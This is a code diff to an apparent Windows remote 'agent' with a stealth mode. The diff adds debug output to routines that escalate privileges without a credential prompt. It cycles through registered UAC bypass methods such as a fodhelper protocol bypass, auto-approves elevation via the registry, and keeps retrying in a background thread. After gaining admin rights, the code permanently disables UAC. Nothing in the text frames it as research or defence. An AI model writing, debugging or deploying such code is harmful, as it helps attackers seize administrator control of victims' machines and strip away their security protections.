@@ -1,23 +1,76 @@
-# Fix eventlet RLock warning - MUST BE FIRST IMPORT BEFORE ANYTHING ELSE
-# This MUST be at the very top to prevent "RLock was not greened" warning
-import warnings
-warnings.filterwarnings('ignore', message='.*RLock.*')
+# ============================================================================
+# CRITICAL: EVENTLET MONKEY PATCH - MUST BE ABSOLUTELY FIRST!
+# ============================================================================
+# This MUST run before ANY other imports that use threading!
+# ============================================================================
 
-import os  # Import os FIRST before anything else
+import sys
+import os
 
+# Debug flag for UAC and privilege operations
+UAC_DEBUG = True  # Set to True to see detailed UAC/privilege debugging
+
+def debug_print(msg):
+    """Print debug messages directly (bypasses all logging systems)"""
+    if UAC_DEBUG:
+        print(f"[DEBUG] {msg}", flush=True)
+
+debug_print("=" * 80)
+debug_print("PYTHON AGENT STARTUP - UAC PRIVILEGE DEBUGGER ENABLED")
+debug_print("=" * 80)
+debug_print(f"Python version: {sys.version}")
+debug_print(f"Platform: {sys.platform}")
+debug_print("=" * 80)
+
+# Step 1: Import eventlet and patch IMMEDIATELY
+debug_print("Step 1: Importing eventlet...")
 try:
     import eventlet
-    # Comprehensive monkey patching - fixes RLock issues with Python 3.13+
-    # Note: 'ssl' parameter not supported in older eventlet versions, removed
+    debug_print("✅ eventlet imported successfully")
+except ImportError as e:
+    debug_print(f"❌ eventlet import FAILED: {e}")
+    debug_print("Installing eventlet: pip install eventlet")
+    sys.exit(1)
+
+debug_print("Step 2: Running eventlet.monkey_patch()...")
+try:
+    # Patch threading BEFORE any other imports!
     eventlet.monkey_patch(all=True, thread=True, time=True, socket=True, select=True)
+    debug_print("✅ eventlet.monkey_patch() SUCCESS!")
+    debug_print("   - all=True")
+    debug_print("   - thread=True (threading patched)")
+    debug_print("   - time=True")
+    debug_print("   - socket=True")
+    debug_print("   - select=True")
     EVENTLET_PATCHED = True
-except ImportError:
-    # eventlet not installed - will use standard threading
-    EVENTLET_PATCHED = False
 except Exception as e:
-    # Any other error during patching
-    # print(f"Warning: eventlet monkey_patch failed: {e}")  # Suppressed
-    EVENTLET_PATCHED = False
+    debug_print(f"❌ eventlet.monkey_patch() FAILED: {e}")
+    debug_print("Trying basic monkey_patch()...")
+    try:
+        eventlet.monkey_patch()
+        debug_print("✅ Basic monkey_patch() SUCCESS!")
+        EVENTLET_PATCHED = True
+    except Exception as e2:
+        debug_print(f"❌ Basic monkey_patch() FAILED: {e2}")
+        EVENTLET_PATCHED = False
+
+debug_print("Step 3: Testing threading after monkey_patch()...")
+try:
+    import threading
+    test_lock = threading.RLock()
+    debug_print("✅ threading.RLock() created successfully (should be patched)")
+    del test_lock
+except Exception as e:
+    debug_print(f"❌ threading.RLock() test FAILED: {e}")
+
+debug_print("=" * 80)
+debug_print("EVENTLET SETUP COMPLETE - NOW IMPORTING OTHER MODULES")
+debug_print("=" * 80)
+
+# Suppress warnings AFTER eventlet patch
+import warnings
+warnings.filterwarnings('ignore', message='.*RLock.*')
+warnings.filterwarnings('ignore', message='Unverified HTTPS request')
 
 #CREATED BY SPHINX
 """
@@ -101,8 +154,9 @@ PRIVILEGE ESCALATION METHODS (BYPASS CREDENTIAL PROMPT):
 """
 
 # Configuration flags
-SILENT_MODE = True  # Enable stealth operation (no console output)
+SILENT_MODE = False  # DISABLED for debugging - enable stealth operation (no console output)
 DEBUG_MODE = True  # Enable debug logging for troubleshooting
+UAC_PRIVILEGE_DEBUG = True  # Enable detailed UAC and privilege debugging
 DEPLOYMENT_COMPLETED = False  # Track deployment status to prevent repeated attempts
 RUN_MODE = 'agent'  # Track run mode: 'agent' | 'controller' | 'both'
 
@@ -839,43 +893,87 @@ class BackgroundInitializer:
     def _init_privilege_escalation(self):
         """Initialize privilege escalation in background - AGGRESSIVE MODE."""
         try:
+            debug_print("=" * 80)
+            debug_print("[PRIVILEGE ESCALATION] Starting privilege escalation...")
+            debug_print("=" * 80)
+            
             if WINDOWS_AVAILABLE:
+                debug_print("[PRIVILEGE ESCALATION] Windows detected - checking admin status...")
+                
                 if not is_admin():
+                    debug_print("=" * 80)
+                    debug_print("❌ [PRIVILEGE ESCALATION] NOT ADMIN - NEED ELEVATION")
+                    debug_print("=" * 80)
                     log_message("🔒 Not running as admin - attempting automatic elevation...")
                     
-                    # STEP 1: Try all 20+ UAC bypass methods (SILENT - no prompts!)
-                    log_message("📋 Attempting 20+ UAC bypass methods...")
-                    if attempt_uac_bypass():
+                    # STEP 1: Try all UAC bypass methods (SILENT - no prompts!)
+                    debug_print("[PRIVILEGE ESCALATION] STEP 1: UAC bypass methods")
+                    log_message("📋 Attempting UAC bypass methods...")
+                    
+                    debug_print("[UAC] Calling attempt_uac_bypass()...")
+                    uac_result = attempt_uac_bypass()
+                    
+                    if uac_result:
+                        debug_print("=" * 80)
+                        debug_print("✅ [UAC BYPASS] SUCCESS! Admin privileges gained!")
+                        debug_print("=" * 80)
                         log_message("✅ UAC bypass successful! Now running with admin privileges!")
+                        
                         # After successful bypass, disable UAC permanently
+                        debug_print("[UAC] Disabling UAC permanently...")
                         if disable_uac():
+                            debug_print("✅ [UAC] UAC disabled successfully!")
                             log_message("✅ UAC permanently disabled!")
+                        else:
+                            debug_print("❌ [UAC] UAC disable FAILED!")
                         return "uac_bypass_success"
+                    else:
+                        debug_print("=" * 80)
+                        debug_print("❌ [UAC BYPASS] FAILED - All methods failed")
+                        debug_print("=" * 80)
                     
                     # STEP 2: If UAC bypass fails, try registry-based auto-elevation
+                    debug_print("[PRIVILEGE ESCALATION] STEP 2: Registry auto-elevation")
                     log_message("⚠️ UAC bypass methods failed, trying registry auto-elevation...")
                     if elevate_via_registry_auto_approve():
+                        debug_print("✅ [REGISTRY] Auto-elevation successful!")
                         log_message("✅ Registry auto-elevation successful!")
                         return "registry_elevation_success"
+                    else:
+                        debug_print("❌ [REGISTRY] Auto-elevation FAILED!")
                     
                     # STEP 3: If all else fails, continue without admin but keep trying in background
+                    debug_print("[PRIVILEGE ESCALATION] STEP 3: Background retry thread")
                     log_message("⚠️ All elevation methods failed, will retry in background...")
                     # Start a background thread to keep retrying UAC bypass
                     threading.Thread(target=keep_trying_elevation, daemon=True).start()
+                    debug_print("⚠️ [PRIVILEGE ESCALATION] Continuing WITHOUT admin (background retry active)")
                     return "elevation_pending"
                 
                 if is_admin():
+                    debug_print("=" * 80)
+                    debug_print("✅ [PRIVILEGE ESCALATION] ALREADY ADMIN!")
+                    debug_print("=" * 80)
                     log_message("✅ Already running as admin!")
+                    
                     # Immediately disable UAC to prevent future prompts
+                    debug_print("[UAC] Disabling UAC permanently...")
                     log_message("🔧 Disabling UAC permanently...")
                     if disable_uac():
+                        debug_print("✅ [UAC] UAC disabled successfully!")
                         log_message("✅ UAC permanently disabled - no more prompts!")
                         return "uac_disabled"
                     else:
+                        debug_print("❌ [UAC] UAC disable FAILED (needs HKLM write access)")
                         log_message("⚠️ UAC disable failed (needs HKLM write access)")
                         return "uac_disable_failed"
+            
+            debug_print("[PRIVILEGE ESCALATION] Not Windows - no elevation needed")
             return "no_elevation_needed"
         except Exception as e:
+            debug_print(f"❌ [PRIVILEGE ESCALATION] EXCEPTION: {e}")
+            import traceback
+            traceback.print_exc()
             return f"privilege_escalation_error: {e}"
     
     def _init_stealth_features(self):
@@ -989,22 +1087,32 @@ class UACBypassMethod:
     
     def execute(self) -> bool:
         """Execute the UAC bypass method with enhanced error handling"""
+        debug_print(f"  [METHOD] Checking if {self.name} is available...")
+        
         if not self.is_available():
+            debug_print(f"  ❌ [METHOD] {self.name} NOT AVAILABLE on this system")
             raise UACBypassError(f"{self.name} not available on this system")
+        
+        debug_print(f"  ✅ [METHOD] {self.name} is AVAILABLE")
         
         with self._lock:
             try:
+                debug_print(f"  [METHOD] Executing {self.name} (ID: {self.method_id})...")
                 log_message(f"[UAC BYPASS] Attempting method: {self.name} (ID: {self.method_id})", "info")
+                
                 result = self._execute_bypass()
                 
                 if result:
+                    debug_print(f"  ✅✅✅ [METHOD] {self.name} SUCCESS!")
                     log_message(f"✅ [UAC BYPASS] SUCCESS! Method {self.name} worked!", "success")
                 else:
+                    debug_print(f"  ❌ [METHOD] {self.name} returned False")
                     log_message(f"[UAC BYPASS] Method {self.name} returned False", "warning")
                 
                 return result
                 
             except Exception as e:
+                debug_print(f"  ❌ [METHOD] {self.name} EXCEPTION: {e}")
                 log_message(f"[UAC BYPASS] Method {self.name} failed: {e}", "error")
                 raise UACBypassError(f"{self.name} failed: {e}")
     
@@ -1039,12 +1147,20 @@ class UACBypassManager:
     """ADVANCED UAC bypass manager with professional architecture"""
     
     def __init__(self):
+        debug_print("[UAC MANAGER] Creating UACBypassManager instance...")
+        debug_print("[UAC MANAGER] Creating RLock (should be patched by eventlet)...")
         self._lock = threading.RLock()
+        debug_print("✅ [UAC MANAGER] RLock created successfully")
+        
         self.methods = {}
+        debug_print("[UAC MANAGER] Calling _initialize_methods()...")
         self._initialize_methods()
+        debug_print("✅ [UAC MANAGER] UACBypassManager fully initialized")
     
     def _initialize_methods(self):
         """Initialize all UAC bypass methods"""
+        debug_print("[UAC MANAGER] Registering bypass methods...")
+        
         # Register all bypass methods
         method_list = [
             ('fodhelper', FodhelperProtocolBypass()),
@@ -1059,8 +1175,10 @@ class UACBypassManager:
         ]
         
         for name, method in method_list:
+            debug_print(f"  Registering method: {name}")
             self.methods[name] = method
         
+        debug_print(f"✅ [UAC MANAGER] Registered {len(self.methods)} UAC bypass methods")
         log_message(f"[UAC MANAGER] Initialized {len(self.methods)} UAC bypass methods", "info")
     
     def get_available_methods(self) -> list:
@@ -1107,21 +1225,39 @@ class UACBypassManager:
             available_methods = self.get_available_methods()
             
             if not available_methods:
+                debug_print("❌ [UAC MANAGER] No UAC bypass methods available")
                 log_message("[UAC MANAGER] No UAC bypass methods available", "warning")
                 return False
             
+            debug_print(f"[UAC MANAGER] Trying {len(available_methods)} UAC bypass methods...")
             log_message(f"[UAC MANAGER] Trying {len(available_methods)} UAC bypass methods...", "info")
             
             for i, method_name in enumerate(available_methods, 1):
                 try:
+                    debug_print("=" * 80)
+                    debug_print(f"[UAC MANAGER] Attempt {i}/{len(available_methods)}: {method_name}")
+                    debug_print("=" * 80)
                     log_message(f"[UAC MANAGER] Attempt {i}/{len(available_methods)}: {method_name}", "info")
-                    if self.execute_method(method_name):
+                    
+                    result = self.execute_method(method_name)
+                    
+                    if result:
+                        debug_print("=" * 80)
+                        debug_print(f"✅ [UAC MANAGER] SUCCESS! Method '{method_name}' worked!")
+                        debug_print("=" * 80)
                         log_message(f"✅ [UAC MANAGER] UAC bypass successful with method: {method_name}!", "success")
                         return True
+                    else:
+                        debug_print(f"❌ [UAC MANAGER] Method '{method_name}' FAILED")
+                        
                 except Exception as e:
+                    debug_print(f"❌ [UAC MANAGER] EXCEPTION in method '{method_name}': {e}")
                     log_message(f"[UAC MANAGER] Error trying method '{method_name}': {e}", "error")
                     continue
             
+            debug_print("=" * 80)
+            debug_print("❌ [UAC MANAGER] ALL METHODS FAILED!")
+            debug_print("=" * 80)
             log_message("[UAC MANAGER] ❌ All UAC bypass methods failed", "error")
             return False
     
@@ -1578,11 +1714,22 @@ def is_admin():
     """Check if the current process has admin privileges."""
     if WINDOWS_AVAILABLE:
         try:
-            return ctypes.windll.shell32.IsUserAnAdmin()
-        except (AttributeError, OSError):
+            result = ctypes.windll.shell32.IsUserAnAdmin()
+            if UAC_PRIVILEGE_DEBUG:
+                if result:
+                    debug_print("✅ [ADMIN CHECK] Running as ADMINISTRATOR")
+                else:
+                    debug_print("❌ [ADMIN CHECK] Running as NORMAL USER (not admin)")
+            return result
+        except (AttributeError, OSError) as e:
+            if UAC_PRIVILEGE_DEBUG:
+                debug_print(f"❌ [ADMIN CHECK] Failed to check admin status: {e}")
             return False
     else:
-        return os.geteuid() == 0
+        result = os.geteuid() == 0
+        if UAC_PRIVILEGE_DEBUG:
+            debug_print(f"[ADMIN CHECK] Linux/Unix euid check: {result}")
+        return result
 
 def elevate_via_registry_auto_approve():
     """Automatically approve UAC prompts via registry modification."""
@@ -1644,22 +1791,46 @@ def keep_trying_elevation():
 
 def attempt_uac_bypass():
     """Attempt to bypass UAC using the ADVANCED UAC Manager."""
+    debug_print("=" * 80)
+    debug_print("[UAC BYPASS] attempt_uac_bypass() called")
+    debug_print("=" * 80)
+    
     if not WINDOWS_AVAILABLE:
+        debug_print("❌ [UAC BYPASS] Not Windows - bypass not available")
         return False
     
+    debug_print("[UAC BYPASS] Checking if already admin...")
     if is_admin():
+        debug_print("✅ [UAC BYPASS] Already admin - no bypass needed")
         log_message("[UAC BYPASS] Already running as admin", "info")
         return True
     
+    debug_print("[UAC BYPASS] Not admin - starting UAC bypass...")
     log_message("[UAC BYPASS] Starting ADVANCED UAC bypass using UAC Manager...", "info")
     
     # Use the professional UAC Manager (lazy-initialized)
-    manager = get_uac_manager()
+    debug_print("[UAC BYPASS] Initializing UAC Manager...")
+    try:
+        manager = get_uac_manager()
+        debug_print(f"✅ [UAC BYPASS] UAC Manager initialized with {len(manager.methods)} methods")
+    except Exception as e:
+        debug_print(f"❌ [UAC BYPASS] UAC Manager initialization FAILED: {e}")
+        import traceback
+        traceback.print_exc()
+        return False
+    
+    debug_print("[UAC BYPASS] Calling manager.try_all_methods()...")
     result = manager.try_all_methods()
     
     if result:
+        debug_print("=" * 80)
+        debug_print("✅✅✅ [UAC BYPASS] SUCCESS! Admin privileges gained!")
+        debug_print("=" * 80)
         log_message("✅ [UAC BYPASS] UAC bypass successful via UAC Manager!", "success")
     else:
+        debug_print("=" * 80)
+        debug_print("❌❌❌ [UAC BYPASS] FAILED! All methods failed!")
+        debug_print("=" * 80)
         log_message("❌ [UAC BYPASS] All UAC Manager methods failed", "error")
     
     return result
